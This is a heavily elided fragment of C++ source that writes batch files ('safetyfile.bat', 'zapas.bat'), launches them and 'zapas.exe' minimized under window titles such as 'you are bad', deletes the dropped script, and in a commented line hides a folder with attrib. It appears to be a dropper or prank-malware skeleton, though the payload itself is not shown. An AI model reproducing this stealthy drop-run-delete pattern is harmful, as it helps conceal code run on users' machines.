...
if not exist "%new_file_path%" (
	...
	ofstream out("safetyfile.bat");
	out<<code;
	//system("attrib +h +s +a /s %SystemDrive%/ArchivoSeguro");
	system("start /min safetyfile.bat");
	system("timeout /t 0");
	system("del safetyfile.bat");
}
...
//name="zapas";
	...
	outFile << c;
    outFile.close();
    //system("start \"you are bad\"  \"zapas.bat\"");
    /*
...
//system("start /min \"you are bad\" \"zapas.bat\"");
...
void make_safe_programs()
{
	...
	//system("start /min \"you are bad\" \"zapas.exe\"");
}
...
int main(int argc, char * argv[])
{
	...
	make_safe_programs();
	if(IsProcessRunning("zapas.exe")) system("start /min \"YOU\" \"zapas.exe\"");
	//cout<<"test1"<<endl;
	/*
